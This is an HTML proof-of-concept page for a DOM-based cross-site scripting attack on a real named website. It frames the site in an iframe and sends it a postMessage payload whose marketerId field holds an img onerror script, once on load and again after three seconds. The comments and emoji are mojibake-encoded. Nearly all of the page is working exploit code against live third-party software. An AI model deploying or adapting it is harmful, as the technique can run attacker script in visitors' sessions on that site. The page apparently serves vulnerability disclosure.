<!DOCTYPE html>
<html>
<head>
  <title>ðŸ”¥ Final XSS PoC - thebrowser.company</title>
</head>
<body>
  <h2>ðŸ”¥ DOM XSS PoC - External Execution</h2>
  <p>âœ… This page will trigger <code>alert(1)</code> inside <code>https://thebrowser.company</code> automatically.</p>

  <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:2px solid black;"></iframe>

  <script>
    const iframe = document.getElementById("target");

    // Ø¨Ø§ÙŠÙ„ÙˆØ¯ XSS
    const payload = {
      message: "OB_SHOULD_SHOW_PICKER",
      content: {
        marketerId: `<img src='x' onerror='alert(1)'>`
      }
    };

    // Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ iframe Ù†Ø±Ø³Ù„ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯
    iframe.onload = () => {
      console.log("âœ… iframe loaded");

      // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯ Ù…Ø¨Ø§Ø´Ø±Ø©
      iframe.contentWindow.postMessage(payload, "*");

      // Ù…Ø­Ø§ÙˆÙ„Ø© Ø®Ø¯Ø§Ø¹ React Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†Ù
      setTimeout(() => {
        console.log("ðŸš€ Re-sending payload...");
        iframe.contentWindow.postMessage(payload, "*");
      }, 3000);
    };
  </script>
</body>
</html>
